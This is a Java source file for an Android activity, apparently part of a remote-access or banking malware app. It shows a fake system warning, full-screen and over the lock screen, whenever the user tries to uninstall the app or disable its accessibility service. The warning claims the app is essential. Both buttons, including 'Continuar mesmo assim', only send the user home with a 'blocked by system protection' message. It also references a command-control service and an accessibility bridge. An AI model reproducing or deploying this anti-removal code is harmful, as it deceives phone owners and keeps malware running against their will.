package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

/**
 * 🛡️ AntiRemovalWarningActivity
 * Tela de aviso do sistema quando o usuário tenta desinstalar o app ou desativar acessibilidade nas configurações.
 * Exibe a caixa de diálogo exata da imagem do sistema com contagem regressiva e opções.
 */
public class AntiRemovalWarningActivity extends Activity {

    private TextView tvCountdown;
    private CountDownTimer countDownTimer;
    private int secondsRemaining = 6;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Configuração de janela cheia, sem barra de título, acima da lockscreen
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN | 
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_FULLSCREEN | 
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        );

        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
        );

        // Construção dinâmica da UI correspondente à imagem
        setContentView(buildLayout());

        // Inicia contagem regressiva no topo
        startCountdown();
    }

    private View buildLayout() {
        // Layout Raiz: Fundo Vermelho Vivo do Sistema
        FrameLayout rootLayout = new FrameLayout(this);
        rootLayout.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        rootLayout.setBackgroundColor(Color.parseColor("#D32F2F"));

        // Container Central
        LinearLayout centerContainer = new LinearLayout(this);
        centerContainer.setOrientation(LinearLayout.VERTICAL);
        centerContainer.setGravity(Gravity.CENTER_HORIZONTAL);
        FrameLayout.LayoutParams centerParams = new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        centerParams.gravity = Gravity.CENTER;
        centerParams.setMargins(dpToPx(24), dpToPx(16), dpToPx(24), dpToPx(16));
        centerContainer.setLayoutParams(centerParams);

        // Texto de Contagem Regressiva no topo (Ex: "6")
        tvCountdown = new TextView(this);
        tvCountdown.setText("6");
        tvCountdown.setTextColor(Color.WHITE);
        tvCountdown.setTextSize(TypedValue.COMPLEX_UNIT_SP, 38);
        tvCountdown.setTypeface(Typeface.DEFAULT_BOLD);
        tvCountdown.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams countParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        countParams.setMargins(0, 0, 0, dpToPx(18));
        tvCountdown.setLayoutParams(countParams);
        centerContainer.addView(tvCountdown);

        // Cartão Branco Flutuante (Diálogo do Sistema)
        LinearLayout dialogCard = new LinearLayout(this);
        dialogCard.setOrientation(LinearLayout.VERTICAL);
        dialogCard.setGravity(Gravity.CENTER_HORIZONTAL);
        dialogCard.setPadding(dpToPx(24), dpToPx(28), dpToPx(24), dpToPx(28));
        
        android.graphics.drawable.GradientDrawable cardBg = new android.graphics.drawable.GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(dpToPx(24));
        dialogCard.setBackground(cardBg);

        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        dialogCard.setLayoutParams(cardParams);

        // 1. Ícone de Alerta Triângulo Amarelo (⚠️)
        TextView tvIcon = new TextView(this);
        tvIcon.setText("⚠️");
        tvIcon.setTextSize(TypedValue.COMPLEX_UNIT_SP, 54);
        tvIcon.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        iconParams.setMargins(0, 0, 0, dpToPx(16));
        tvIcon.setLayoutParams(iconParams);
        dialogCard.addView(tvIcon);

        // 2. Título do Aviso
        TextView tvTitle = new TextView(this);
        tvTitle.setText("Este aplicativo é essencial para o funcionamento do sistema");
        tvTitle.setTextColor(Color.parseColor("#111827"));
        tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);
        tvTitle.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        tvTitle.setGravity(Gravity.CENTER);
        tvTitle.setLineSpacing(dpToPx(2), 1.15f);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        titleParams.setMargins(0, 0, 0, dpToPx(14));
        tvTitle.setLayoutParams(titleParams);
        dialogCard.addView(tvTitle);

        // 3. Subtítulo Explicativo
        TextView tvSubtitle = new TextView(this);
        tvSubtitle.setText("A remoção pode comprometer o desempenho do seu dispositivo.");
        tvSubtitle.setTextColor(Color.parseColor("#4B5563"));
        tvSubtitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        tvSubtitle.setGravity(Gravity.CENTER);
        tvSubtitle.setLineSpacing(dpToPx(2), 1.1f);
        LinearLayout.LayoutParams subParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        subParams.setMargins(0, 0, 0, dpToPx(14));
        tvSubtitle.setLayoutParams(subParams);
        dialogCard.addView(tvSubtitle);

        // 4. Pergunta
        TextView tvQuestion = new TextView(this);
        tvQuestion.setText("Deseja continuar mesmo assim?");
        tvQuestion.setTextColor(Color.parseColor("#374151"));
        tvQuestion.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        tvQuestion.setTypeface(Typeface.DEFAULT, Typeface.NORMAL);
        tvQuestion.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams qParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        qParams.setMargins(0, 0, 0, dpToPx(22));
        tvQuestion.setLayoutParams(qParams);
        dialogCard.addView(tvQuestion);

        // 5. Container Horizontal de Botões
        LinearLayout btnContainer = new LinearLayout(this);
        btnContainer.setOrientation(LinearLayout.HORIZONTAL);
        btnContainer.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams btnBoxParams = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        btnContainer.setLayoutParams(btnBoxParams);

        // Botão Cancelar (Cinza)
        Button btnCancel = new Button(this);
        btnCancel.setText("Cancelar");
        btnCancel.setTextColor(Color.parseColor("#1F2937"));
        btnCancel.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        btnCancel.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        btnCancel.setAllCaps(false);
        
        android.graphics.drawable.GradientDrawable cancelBg = new android.graphics.drawable.GradientDrawable();
        cancelBg.setColor(Color.parseColor("#E5E7EB"));
        cancelBg.setCornerRadius(dpToPx(20));
        btnCancel.setBackground(cancelBg);

        LinearLayout.LayoutParams cancelParams = new LinearLayout.LayoutParams(
            0,
            dpToPx(48),
            1.0f
        );
        cancelParams.setMargins(0, 0, dpToPx(8), 0);
        btnCancel.setLayoutParams(cancelParams);

        btnCancel.setOnClickListener(v -> exitToHome());

        // Botão Continuar mesmo assim (Azul)
        Button btnContinue = new Button(this);
        btnContinue.setText("Continuar mesmo assim");
        btnContinue.setTextColor(Color.WHITE);
        btnContinue.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        btnContinue.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        btnContinue.setAllCaps(false);

        android.graphics.drawable.GradientDrawable continueBg = new android.graphics.drawable.GradientDrawable();
        continueBg.setColor(Color.parseColor("#0066FF"));
        continueBg.setCornerRadius(dpToPx(20));
        btnContinue.setBackground(continueBg);

        LinearLayout.LayoutParams continueParams = new LinearLayout.LayoutParams(
            0,
            dpToPx(48),
            1.15f
        );
        continueParams.setMargins(dpToPx(4), 0, 0, 0);
        btnContinue.setLayoutParams(continueParams);

        btnContinue.setOnClickListener(v -> {
            Toast.makeText(this, "Ação bloqueada pela proteção do sistema.", Toast.LENGTH_SHORT).show();
            exitToHome();
        });

        btnContainer.addView(btnCancel);
        btnContainer.addView(btnContinue);

        dialogCard.addView(btnContainer);

        centerContainer.addView(dialogCard);
        rootLayout.addView(centerContainer);

        return rootLayout;
    }

    private void startCountdown() {
        countDownTimer = new CountDownTimer(6000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                secondsRemaining = (int) (millisUntilFinished / 1000);
                if (tvCountdown != null) {
                    tvCountdown.setText(String.valueOf(Math.max(secondsRemaining, 0)));
                }
            }

            @Override
            public void onFinish() {
                if (tvCountdown != null) {
                    tvCountdown.setText("0");
                }
                exitToHome();
            }
        }.start();
    }

    private void exitToHome() {
        if (countDownTimer != null) {
            try { countDownTimer.cancel(); } catch (Exception ignored) {}
        }
        
        try {
            CommandControlService.requestAdminRuntime = false;
        } catch (Exception ignored) {}

        try {
            if (UiAssistBridge.instance != null) {
                UiAssistBridge.instance.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
            }
        } catch (Exception ignored) {}

        try {
            android.content.Intent homeIntent = new android.content.Intent(android.content.Intent.ACTION_MAIN);
            homeIntent.addCategory(android.content.Intent.CATEGORY_HOME);
            homeIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(homeIntent);
        } catch (Exception ignored) {}

        finish();
    }

    @Override
    public void onBackPressed() {
        exitToHome();
    }

    private int dpToPx(int dp) {
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            dp,
            getResources().getDisplayMetrics()
        );
    }
}
